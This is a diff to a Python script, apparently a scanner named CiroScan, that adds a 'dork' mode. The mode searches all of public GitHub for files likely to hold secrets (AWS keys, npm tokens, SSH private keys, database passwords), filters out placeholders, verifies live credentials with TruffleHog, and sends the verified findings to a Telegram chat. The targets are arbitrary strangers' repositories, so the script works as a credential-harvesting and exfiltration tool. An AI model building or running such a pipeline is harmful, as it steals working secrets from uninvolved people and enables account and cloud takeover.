@@ -3,6 +3,7 @@ import os
 import json
 import re
 import time
+import random
 import shutil
 import subprocess
 import tempfile
@@ -20,17 +21,43 @@ FEED_MODE = (
     or os.getenv("FEED_MODE", "").strip().lower() in ("1", "true", "yes")
 )
 # === [BARU] === Konfigurasi feed (semua via env supaya bisa diatur di workflow)
-FEED_EVENT_PAGES = int(os.getenv("FEED_EVENT_PAGES", "2"))        # halaman event disedot (100 event/halaman)
-FEED_MAX_USERS = int(os.getenv("FEED_MAX_USERS", "5"))            # maksimal berapa user yang dipicked
-FEED_MAX_REPOS_PER_USER = int(os.getenv("FEED_MAX_REPOS_PER_USER", "3"))  # maks repo per user
-FEED_MAX_TOTAL_REPOS = int(os.getenv("FEED_MAX_TOTAL_REPOS", "50"))        # total plafon repo per run (naik ke 50)
-REPO_SCAN_TIMEOUT = int(os.getenv("REPO_SCAN_TIMEOUT", "300"))               # timeout maks 5 menit (300 detik) per repo — repo gede butuh waktu clone+scan
-CONCURRENCY_WORKERS = int(os.getenv("CONCURRENCY_WORKERS", "4"))             # parallel multi-worker TruffleHog
+FEED_EVENT_PAGES = int(os.getenv("FEED_EVENT_PAGES", "2"))
+FEED_MAX_USERS = int(os.getenv("FEED_MAX_USERS", "5"))
+FEED_MAX_REPOS_PER_USER = int(os.getenv("FEED_MAX_REPOS_PER_USER", "3"))
+FEED_MAX_TOTAL_REPOS = int(os.getenv("FEED_MAX_TOTAL_REPOS", "50"))
+REPO_SCAN_TIMEOUT = int(os.getenv("REPO_SCAN_TIMEOUT", "300"))
+CONCURRENCY_WORKERS = int(os.getenv("CONCURRENCY_WORKERS", "4"))
 FEED_EXCLUDE = {u.strip().lower() for u in os.getenv("FEED_EXCLUDE", "").split(",") if u.strip()}
+
+# === [DORK] === Mode dork global: aktif kalau target = "dork", argumen --dork, atau env DORK_MODE
+DORK_MODE = (
+    TARGET_INPUT.strip().lower() in ("dork", "@dork")
+    or "--dork" in sys.argv
+    or os.getenv("DORK_MODE", "").strip().lower() in ("1", "true", "yes")
+)
+# === [DORK] === Konfigurasi dork
+# List query dipisahkan dengan karakter '|' (pipe), contoh:
+#   DORK_QUERIES: "filename:.npmrc _authToken|filename:.env AWS_SECRET_ACCESS_KEY"
+DORK_QUERIES_RAW = os.getenv("DORK_QUERIES", "").strip()
+DORK_QUERIES_PER_RUN = int(os.getenv("DORK_QUERIES_PER_RUN", "3"))   # query dijalankan per run (rate limit code search = 10/menit)
+DORK_MAX_REPOS = int(os.getenv("DORK_MAX_REPOS", "15"))              # plafon repo target per run
+DORK_MAX_REPO_SIZE_KB = int(os.getenv("DORK_MAX_REPO_SIZE_KB", "200000"))  # skip repo raksasa (clone lama)
+# Query default kalau env tidak diisi — set aman & terbukti produktif
+DORK_DEFAULT_QUERIES = [
+    "filename:.npmrc _authToken",
+    "filename:.env AWS_SECRET_ACCESS_KEY",
+    "filename:id_rsa",
+    "filename:wp-config.php DB_PASSWORD",
+    "filename:credentials.xml password",
+    "filename:settings.py SECRET_KEY",
+    "filename:terraform.tfvars password",
+    "filename:.env MAIL_PASSWORD",
+]
 
 def _parse_search_keyword():
     """Ambil kata kunci pencarian teks bebas dari CLI (--search / -bebas) atau env."""
-    args = [a for a in sys.argv[2:] if a != "--feed"]  # === [UBAH] === filter flag --feed
+    # === [DORK] === filter flag --feed DAN --dork
+    args = [a for a in sys.argv[2:] if a not in ("--feed", "--dork")]
     for i, a in enumerate(args):
         if a in ("--search", "-bebas") and i + 1 < len(args):
             return args[i + 1].strip()
@@ -45,7 +72,7 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")
 GH_PAT = os.getenv("GH_PAT", "")
 
-# === [BARU] === Helper API GitHub dengan rate-limit handling (dipakai mode feed)
+# === [DORK] === Helper API GitHub dengan rate-limit handling (dipakai semua mode)
 def _gh_api_get(url, retries=2):
     headers = {"User-Agent": "CiroScan-BatchEngine", "Accept": "application/vnd.github+json"}
     if GH_PAT:
@@ -68,6 +95,121 @@ def _gh_api_get(url, retries=2):
             print(f"⚠️ API gagal ({url}): {e}")
             return None
     return None
+
+# === [DORK] ================================================================
+# MODE DORK GLOBAL: pakai GitHub Code Search API untuk menemukan repo yang berisi
+# file sensitif (.env, id_rsa, dll.) di SELURUH GitHub publik — bukan cuma yang
+# aktif di feed. Hasilnya langsung diserahkan ke pipeline TruffleHog yang ada.
+# ===========================================================================
+def _gh_code_search(query, retries=2):
+    """Satu query code search. Return list item hasil (atau None kalau gagal total)."""
+    if not GH_PAT:
+        print("❌ Mode DORK WAJIB pakai GH_PAT (code search tidak bisa anonymous).")
+        return None
+    headers = {
+        "User-Agent": "CiroScan-BatchEngine",
+        "Accept": "application/vnd.github.text-match+json",  # bawa snippet text-match
+    }
+    if GH_PAT:
+        headers["Authorization"] = f"Bearer {GH_PAT}"
+    params = {"q": query, "per_page": 100}
+    for attempt in range(retries + 1):
+        try:
+            resp = requests.get("https://api.github.com/search/code",
+                                headers=headers, params=params, timeout=25)
+            # Code search rate limit = 10 req/menit → kalau kena, tunggu reset
+            if resp.status_code in (403, 429) and attempt < retries:
+                reset = int(resp.headers.get("X-RateLimit-Reset", "0") or 0)
+                wait = min(max(reset - time.time() + 2, 7), 90)
+                print(f"⏳ Search rate limit kena untuk query ini, jeda {int(wait)}s...")
+                time.sleep(wait)
+                continue
+            resp.raise_for_status()
+            return resp.json().get("items", [])
+        except Exception as e:
+            if attempt < retries:
+                time.sleep(7)  # jeda aman utk 10 req/menit
+                continue
+            print(f"⚠️ Code search gagal ({query!r}): {e}")
+            return None
+    return None
+
+_PLACEHOLDER_SNIPPET = re.compile(
+    r"(changeme|change_me|change-me|example|placeholder|xxx+|your[_-]?key|"
+    r"your[_-]?password|dummy|sample|test[_-]?key|insert[_-]?key|todo)", re.I)
+
+def _dork_item_useful(item):
+    """Filter kasar hasil search: buang fork, node_modules, template placeholder."""
+    repo = item.get("repository") or {}
+    if repo.get("fork"):
+        return False
+    if repo.get("size", 0) > DORK_MAX_REPO_SIZE_KB:
+        return False
+    fpath = item.get("path") or ""
+    if "node_modules/" in fpath or "vendor/" in fpath or fpath.lower().startswith("test"):
+        return False
+    # Cek snippet text-match: kalau semua match-nya placeholder, skip
+    tms = item.get("text_matches") or []
+    if tms:
+        joined = " ".join(t.get("fragment", "") for t in tms)
+        if _PLACEHOLDER_SNIPPET.search(joined):
+            return False
+    return True
+
+def collect_targets_from_dork():
+    """Return (targets, dork_detail). dork_detail = info query → jml hasil."""
+    queries = [q.strip() for q in DORK_QUERIES_RAW.split("|") if q.strip()] \
+              if DORK_QUERIES_RAW else list(DORK_DEFAULT_QUERIES)
+    if not queries:
+        print("❌ Tidak ada query dork tersedia.")
+        return [], []
+
+    # Rotasi: ambil sebagian query secara acak tiap run → jangkauan meluas antar-run
+    n = min(DORK_QUERIES_PER_RUN, len(queries))
+    picked_queries = random.sample(queries, n)
+    print(f"🎣 DORK GLOBAL: {len(queries)} query di pool, {n} dipilih run ini:")
+    for q in picked_queries:
+        print(f"   • {q}")
+
+    if not GH_PAT:
+        send_telegram_text("❌ <b>Mode DORK gagal</b> — GH_PAT wajib diisi di secrets untuk code search.")
+        return [], []
+
+    repo_urls = []      # urutan penemuan (dipertahankan, jangan sorted)
+    seen = set()
+    dork_detail = []
+
+    for qi, query in enumerate(picked_queries, 1):
+        items = _gh_code_search(query)
+        if items is None:
+            dork_detail.append({"query": query, "found": 0, "error": True})
+            continue
+        added = 0
+        for item in items:
+            if len(repo_urls) >= DORK_MAX_REPOS:
+                break
+            if not _dork_item_useful(item):
+                continue
+            full_name = (item.get("repository") or {}).get("full_name")
+            if not full_name or full_name in seen:
+                continue
+            seen.add(full_name)
+            repo_urls.append(f"https://github.com/{full_name}")
+            added += 1
+        dork_detail.append({"query": query, "found": added})
+        print(f"   → [{qi}/{n}] {added} repo kandidat dari: {query}")
+        if len(repo_urls) >= DORK_MAX_REPOS:
+            print(f"   🛑 Plafon {DORK_MAX_REPOS} repo tercapai.")
+            break
+        if qi < n:
+            time.sleep(7)  # jaga rate limit 10 query/menit
+
+    repo_urls = repo_urls[:DORK_MAX_REPOS]
+    if repo_urls:
+        print(f"✅ Total {len(repo_urls)} repo target dari dork: "
+              f"{', '.join(u.split('/')[-1] for u in repo_urls[:10])}{'…' if len(repo_urls) > 10 else ''}")
+    return repo_urls, dork_detail
+# === [SELESAI DORK] =======================================================
 
 def send_telegram_text(text):
     if not TELEGRAM_BOT_TOKEN:
@@ -165,7 +307,6 @@ def collect_targets_from_feed():
             print(f"⚠️ Halaman {page}: tidak ada data event / gagal fetch.")
             break
         for ev in events:
-            # hanya event yang menandakan aktivitas kode (bukan watch/fork doang)
             if ev.get("type") not in ("PushEvent", "PullRequestEvent", "IssuesEvent",
                                        "IssueCommentEvent", "CreateEvent", "ReleaseEvent"):
                 continue
@@ -177,7 +318,7 @@ def collect_targets_from_feed():
                 continue
             if actor not in users_seen:
                 users_seen[actor] = repo
-        time.sleep(1)  # santai sedikit biar tidak dibatasi
+        time.sleep(1)
 
     if not users_seen:
         print("❌ Feed kosong — tidak ada user yang bisa dipicked.")
@@ -190,14 +331,12 @@ def collect_targets_from_feed():
 
     targets, feed_detail = [], []
     detail_by_user = {}
-    # Strategi 1: repo yang BARU di-push/diubah user tsb (paling fresh, bocoran paling mungkin)
     for u in picked_users:
         targets.append(f"https://github.com/{users_seen[u]}")
         entry = {"user": u, "repos": [users_seen[u]], "source": "feed (baru aktif)"}
         feed_detail.append(entry)
         detail_by_user[u] = entry
 
-    # Strategi 2 (opsional): repo lain milik user, diurutkan dari yang terakhir di-push
     if FEED_MAX_REPOS_PER_USER > 1:
         for u in picked_users:
             if len(targets) >= FEED_MAX_TOTAL_REPOS:
@@ -217,7 +356,6 @@ def collect_targets_from_feed():
                     detail_by_user[u]["repos"].append(url)
                     added += 1
 
-    # dedup + plafon akhir
     seen, final = set(), []
     for t in targets:
         if t not in seen:
@@ -351,7 +489,7 @@ def run_text_search(targets, keyword, target_label=""):
     failed_repos = []
     repo_summaries = []
     for idx, repo_url in enumerate(targets, 1):
-        repo_name = "/".join(repo_url.rstrip("/").split("/")[-2:])  # === [UBAH] === nama repo full owner/repo biar tidak ambigu saat banyak user
+        repo_name = "/".join(repo_url.rstrip("/").split("/")[-2:])
         print(f"[{idx}/{total_targets}] Searching '{keyword}' in {repo_name} ({repo_url})...")
         matches, err = search_text_in_repo(repo_url, keyword, repo_name)
         if err:
@@ -420,10 +558,10 @@ def _scan_single_repo(repo_info):
     repo_name = "/".join(repo_url.rstrip("/").split("/")[-2:])
     print(f"[{idx}/{total_targets}] 🚀 Scanning {repo_name} ({repo_url})...")
     cmd = ["trufflehog", "git", repo_url, "--json", "--no-update"]
-    
+
     findings = []
     verified = []
-    
+
     try:
         res = subprocess.run(cmd, capture_output=True, text=True, timeout=REPO_SCAN_TIMEOUT)
     except subprocess.TimeoutExpired:
@@ -474,21 +612,33 @@ def _scan_single_repo(repo_info):
 
 def main():
     feed_detail = []
+    dork_detail = []   # === [DORK] ===
 
-    # === [UBAH] === Cabang mode feed global — target otomatis dari event publik GitHub
-    if FEED_MODE:
+    # === [UBAH] === Prioritas cabang: DORK dulu (lebih spesifik), lalu FEED, lalu manual
+    if DORK_MODE:
+        print("🎣 MODE DORK GLOBAL aktif — target dicari via GitHub Code Search.")
+        targets, dork_detail = collect_targets_from_dork()
+        if not targets:
+            send_telegram_text("⚠️ <b>Mode Dork gagal</b> — tidak ada repo kandidat dari code search. "
+                               "Cek log runner / pastikan GH_PAT valid & env DORK_QUERIES benar.")
+            sys.exit(1)
+        target_label = "DORK GLOBAL (code search)"
+        mode_tag = "dork"
+    elif FEED_MODE:
         print("🛰️ MODE FEED GLOBAL aktif — target ditentukan otomatis.")
         targets, feed_detail = collect_targets_from_feed()
         if not targets:
             send_telegram_text("⚠️ <b>Mode Feed gagal</b> — tidak ada user/repo yang bisa diambil dari event publik. Cek log runner / rate limit (pakai GH_PAT!).")
             sys.exit(1)
         target_label = f"FEED GLOBAL · {len(feed_detail)} user aktif"
+        mode_tag = "feed"
     else:
         if not TARGET_INPUT:
-            print("❌ Error: No target input provided. (atau pakai target 'feed' / env FEED_MODE=1)")
+            print("❌ Error: No target input provided. (atau pakai target 'feed' / 'dork' / env DORK_MODE=1)")
             sys.exit(1)
         targets = resolve_target_repos(TARGET_INPUT)
         target_label = TARGET_INPUT
+        mode_tag = "manual"
 
     # Mode pencarian teks bebas: -bebas <keyword>
     if SEARCH_KEYWORD:
@@ -502,7 +652,22 @@ def main():
         return
 
     is_batch = total_targets > 1
-    if FEED_MODE and is_batch:
+    # === [UBAH] === Pesan mulai: tambah cabang untuk mode DORK
+    if mode_tag == "dork" and is_batch:
+        q_list = "\n".join(f"• <code>{html.escape(d['query'])}</code> → {d['found']} repo"
+                           for d in dork_detail if not d.get("error"))
+        send_telegram_text(
+            f"🎣 <b>DORK-HUNT SCAN DIMULAI!</b>\n\n"
+            f"🌐 <b>Target:</b> Hasil dork Code Search seluruh GitHub\n"
+            f"{q_list}\n\n"
+            f"📦 <b>Total Repositori:</b> <b>{total_targets} repo</b>\n"
+            f"⏳ <i>Runner memindai repo-repo yang file sensitifnya terindikasi...</i>")
+    elif mode_tag == "dork":
+        send_telegram_text(
+            f"🎣 <b>DORK-HUNT SCAN DIMULAI!</b>\n\n"
+            f"🎯 <b>Target:</b> <code>{targets[0]}</code> (<i>dari code search</i>)\n"
+            f"⏳ <i>Sedang mengendus seluruh riwayat commit...</i>")
+    elif FEED_MODE and is_batch:
         user_list = ", ".join(f"@{d['user']}" for d in feed_detail[:10])
         send_telegram_text(
             f"🛰️ <b>FEED-HUNT SCAN DIMULAI!</b>\n\n"
@@ -522,7 +687,7 @@ def main():
 
     tasks = [(i, total_targets, url) for i, url in enumerate(targets, 1)]
     print(f"⚡ Menjalankan parallel scan ({CONCURRENCY_WORKERS} workers, timeout {REPO_SCAN_TIMEOUT}s/repo)...")
-    
+
     with ThreadPoolExecutor(max_workers=CONCURRENCY_WORKERS) as executor:
         future_map = {executor.submit(_scan_single_repo, t): t for t in tasks}
         for future in as_completed(future_map):
@@ -541,11 +706,9 @@ def main():
                 all_findings.extend(res_item["findings"])
                 verified_findings.extend(res_item["verified_findings"])
 
-    # Urutan laporan = urutan target (as_completed acak, jadi diurutkan lagi)
     repo_summaries.sort(key=lambda s: s.get("idx", 0))
     failed_repos.sort(key=lambda s: s.get("idx", 0))
 
-    # findings.json mentah (berisi kunci asli) TIDAK ditulis lagi — cukup file split yang aman
     buckets = {"active": [], "potential": [], "noise": []}
     seen_split = set()
     for data in all_findings:
@@ -569,10 +732,18 @@ def main():
     total_potential = len(buckets["potential"])
     total_noise = len(buckets["noise"])
 
+    # === [UBAH] === Label target di laporan menyesuaikan mode
+    if mode_tag == "dork":
+        report_target_label = "DORK GLOBAL (code search)"
+    elif FEED_MODE:
+        report_target_label = "FEED GLOBAL (auto)"
+    else:
+        report_target_label = target_label
+
     msg_lines = [
         "📊 <b>LAPORAN HASIL AUDIT TRUFFLEHOG</b>",
         "━━━━━━━━━━━━━━━━━━",
-        f"🎯 <b>Target:</b> <code>{'FEED GLOBAL (auto)' if FEED_MODE else target_label}</code>",
+        f"🎯 <b>Target:</b> <code>{report_target_label}</code>",
         f"📦 <b>Repo Discan:</b> <b>{total_targets} repositori</b>",
         f"🚨 <b>Aktif (verified):</b> <b>{total_active}</b>",
         f"⚠️ <b>Potensial:</b> {total_potential}",
@@ -589,6 +760,10 @@ def main():
             else:
                 icon = "❌" if s["verified"] > 0 else "✅"
                 msg_lines.append(f"{icon} <code>{s['repo']}</code> : <b>{s['verified']} aktif bocor</b> ({s['total']} potensi)")
+        # === [DORK] === info query yang dipakai run ini
+        if mode_tag == "dork" and dork_detail:
+            q_short = ", ".join(f"<code>{html.escape(d['query'][:40])}</code>" for d in dork_detail[:5])
+            msg_lines.append(f"\n🎣 <i>Query dork run ini: {q_short}</i>")
         if FEED_MODE and feed_detail:
             msg_lines.append(f"\n🛰️ <i>Target picked otomatis dari feed: "
                              f"{', '.join('@'+d['user'] for d in feed_detail[:10])}</i>")
@@ -610,9 +785,9 @@ def main():
     send_telegram_text(report_text)
 
     if total_active > 0:
-        send_telegram_document("findings_active.json", f"🚨 File JSON Temuan AKTIF ({total_active}) — {'FEED GLOBAL' if FEED_MODE else target_label}")
+        send_telegram_document("findings_active.json", f"🚨 File JSON Temuan AKTIF ({total_active}) — {report_target_label}")
     if total_potential > 0:
-        send_telegram_document("findings_potential.json", f"⚠️ File JSON Temuan POTENSIAL ({total_potential}) — {'FEED GLOBAL' if FEED_MODE else target_label}")
+        send_telegram_document("findings_potential.json", f"⚠️ File JSON Temuan POTENSIAL ({total_potential}) — {report_target_label}")
 
     if failed_repos:
         print(f"❌ {len(failed_repos)} repo gagal discan, keluar dengan error.")
